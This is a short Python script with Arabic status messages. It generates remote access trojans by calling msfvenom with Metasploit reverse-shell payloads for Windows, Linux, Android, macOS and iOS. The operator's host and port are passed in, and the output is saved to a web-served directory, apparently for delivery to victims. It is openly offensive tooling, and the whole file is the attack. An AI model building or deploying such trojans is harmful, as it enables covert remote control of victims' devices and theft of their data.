import os
import subprocess

def generate_metasploit_rat(target, host, port):
    payloads = {
        "windows": "windows/meterpreter/reverse_tcp",
        "linux": "linux/x86/meterpreter/reverse_tcp",
        "android": "android/meterpreter/reverse_tcp",
        "macos": "osx/x86/shell_reverse_tcp",
        "ios": "apple_ios/armle/meterpreter_reverse_tcp"
    }

    payload = payloads.get(target)
    if not payload:
        print("[-] لا يوجد Paylaod لهذا النظام.")
        return

    output_path = f"/var/www/html/rat/rat_{target}.exe"

    print(f"[+] جارٍ إنشاء RAT باستخدام Metasploit...")
    cmd = f'msfvenom -p {payload} LHOST={host} LPORT={port} -o {output_path}'
    subprocess.run(cmd, shell=True)
    print(f"[+] RAT تم حفظه في: {output_path}")